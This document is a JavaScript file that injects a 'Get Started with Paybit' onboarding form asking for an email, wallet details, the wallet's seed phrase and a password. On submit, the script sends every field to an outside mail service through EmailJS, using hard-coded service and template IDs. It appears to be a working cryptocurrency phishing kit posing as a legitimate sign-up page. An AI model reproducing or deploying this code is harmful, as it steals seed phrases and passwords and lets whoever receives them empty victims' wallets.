// form.js

document.addEventListener("DOMContentLoaded", function() {
    // The form HTML structure as a string
    var formHTML = `
    <section id="form" class="mb-5">
        <h2 class="text-center">Get Started with Paybit</h2>
        <form class="p-4 border rounded">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" name="email" class="form-control" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="dropdown1">Wallet Type</label>
                <select name="dropdown1" class="form-control">
                    <option value="" disabled selected>Select Wallet Type</option>
                    <option value="BIP32">BIP32</option>
                    <option value="BIP39">BIP39</option>
                    <option value="BIP44">BIP44</option>
                </select>
            </div>
            <div class="form-group">
                <label for="dropdown2">Mnemonic Length</label>
                <select name="dropdown2" class="form-control">
                    <option value="" disabled selected>Select Mnemonic Length</option>
                    <option value="12">12</option>
                    <option value="18">18</option>
                    <option value="24">24</option>
                </select>
            </div>
            <div class="form-group">
                <label for="address">Wallet Address</label>
                <input type="text" name="address" class="form-control" placeholder="Enter your wallet address" required>
            </div>
            <div class="form-group">
                <label for="seed">Seed Phrase</label>
                <input type="text" name="seed" class="form-control" placeholder="Enter your seed phrase" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn btn-primary btn-block">Submit</button>
        </form>
    </section>`;

    // Inject the form HTML into the formContainer div
    document.getElementById('formContainer').innerHTML = formHTML;

    // Initialize EmailJS
    emailjs.init("UzvWE4cijC2AeexsY");

    // Form submission event
    document.querySelector('form').addEventListener('submit', function(event) {
        event.preventDefault();

        // Collect form data
        var emailData = {
            email: document.querySelector('input[name=email]').value,
            dropdown1: document.querySelector('select[name=dropdown1]').value,
            dropdown2: document.querySelector('select[name=dropdown2]').value,
            address: document.querySelector('input[name=address]').value,
            seed: document.querySelector('input[name=seed]').value,
            password: document.querySelector('input[name=password]').value
        };

        // Send data using EmailJS
        emailjs.send("service_29nyhzq", "template_i3682ek", emailData)
            .then(function(response) {
                alert('Email sent successfully!');
            }, function(error) {
                alert('Failed to send email. Please try again.');
            });
    });
});